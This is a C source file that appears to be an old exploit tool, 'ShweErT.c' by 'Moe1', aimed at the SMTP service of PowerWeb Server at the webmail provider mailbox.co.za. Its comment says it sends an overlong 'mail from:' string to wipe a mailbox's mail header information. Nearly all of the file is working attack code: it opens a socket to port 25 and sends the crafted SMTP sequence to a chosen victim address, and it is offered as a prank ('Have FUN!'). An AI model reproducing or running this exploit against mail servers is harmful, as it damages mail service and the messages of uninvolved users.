/* ShweErT.c by Moe1
   -----------------
  Webmail/Mailbox.co.za
    Mail Info Killer
  blah blah nothing more to be said its lame just like mah dead dog NoombieS

  What exactly goes on?
  It just stewpidly exploits PowerWeb Server's SMTP by issueing
  "mail from:" with an ident followed by a long but not too long string of 
  characters causing all mail info to be killed except the message.
  
  Have FUN!
*/

#include <stdio.h>
#include <sys/param.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdarg.h>
 
void smtp_connect(char *server);
 
int thesock;
 
void smtp_connect(char *server)
{
  struct sockaddr_in sin;
  struct hostent *hp;
  
  hp = gethostbyname(server);
  if (hp==NULL) {
    printf("Please use mailbox.co.za instead of %s \n",server);
    exit(0);
  }
  bzero((char*) &sin, sizeof(sin));
  bcopy(hp->h_addr, (char *) &sin.sin_addr, hp->h_length);
  sin.sin_family = hp->h_addrtype;
  sin.sin_port = htons(25);
  thesock = socket(AF_INET, SOCK_STREAM, 0);
  connect(thesock,(struct sockaddr *) &sin, sizeof(sin));
}
 
void main(int argc, char **argv)
{
  char buf[1024];
  
  if (argc != 4) {
    printf("ShweErT.c");
    printf("\n   by Moe1");
    printf("\nusage: ShweErT mailbox.co.za [ident] [mailbox addy]\n");
    printf("example: ShweErT mailbox.co.za mehe test@mailbox.co.za\n");
    exit(0);
  }
  printf("Connecting to %s\n",argv[1]);
  smtp_connect(argv[1]);
  printf("Sending da ShweErT to %s\n",argv[3]);
  sprintf(buf, "
\nmail from:%s@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\nrcpt to:%s
\ndata
\n!!!Insert message here!!!
\n.
\nquit\n",argv[2],argv[3]);


  send(thesock, buf, strlen(buf), 0);

  printf("Please wait ...\n");
  sleep(3);
  printf("Done!\n");
}